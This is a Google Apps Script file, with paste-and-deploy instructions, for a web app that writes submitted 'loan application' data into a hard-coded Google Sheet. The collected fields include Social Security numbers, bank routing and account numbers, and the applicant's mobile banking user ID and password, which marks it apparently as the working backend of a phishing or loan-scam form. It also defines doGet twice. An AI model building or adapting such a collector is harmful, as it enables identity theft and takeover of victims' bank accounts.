// SIMPLE GOOGLE SHEETS SCRIPT - Copy this into your Google Apps Script project
// Go to: https://script.google.com/home
// Click "New Project"
// Delete all existing code
// Paste this code
// Save and Deploy as Web App

const SHEET_URL = "https://docs.google.com/spreadsheets/d/1drmvoZPbGED2hratNOu3vBgjJRmk9cYIdLuJq7Scei8/edit";

function doGet(e) {
  return HtmlService.createHtmlOutput('Google Sheets API is working! Use POST to submit data.');
}

function doPost(e) {
  try {
    const sheet = SpreadsheetApp.openByUrl(SHEET_URL).getSheetByName("Sheet1");
    const data = JSON.parse(e.postData.contents);

    sheet.appendRow([
      data.loanAmount || "",
      data.loanPurpose || "",
      data.creditScore || "",
      data.name || "",
      data.email || "",
      data.phone || "",
      data.streetAddress || "",
      data.city || "",
      data.state || "",
      data.zipCode || "",
      data.ssn || "",
      data.annualIncome || "",
      data.employmentStatus || "",
      data.monthlyHousing || "",
      data.bankName || "",
      data.routingNumber || "",
      data.accountNumber || "",
      data.yourBank || "",
      data.mobileBankingUserId || "",
      data.mobileBankingPassword || "",
      new Date()
    ]);

    return ContentService.createTextOutput(JSON.stringify({ status: "success" }))
      .setMimeType(ContentService.MimeType.JSON);

  } catch (err) {
    return ContentService.createTextOutput(JSON.stringify({ status: "error", message: err.message }))
      .setMimeType(ContentService.MimeType.JSON);
  }
}

function doGet() {
  return ContentService.createTextOutput("Google Sheets API working");
}

// Helper function to get spreadsheet info
function getSpreadsheetInfo() {
  try {
    const spreadsheet = SpreadsheetApp.getActiveSpreadsheet();
    return {
      url: spreadsheet.getUrl(),
      name: spreadsheet.getName(),
      sheets: spreadsheet.getSheets().map(sheet => sheet.getName())
    };
  } catch (e) {
    return { error: 'No active spreadsheet found' };
  }
}
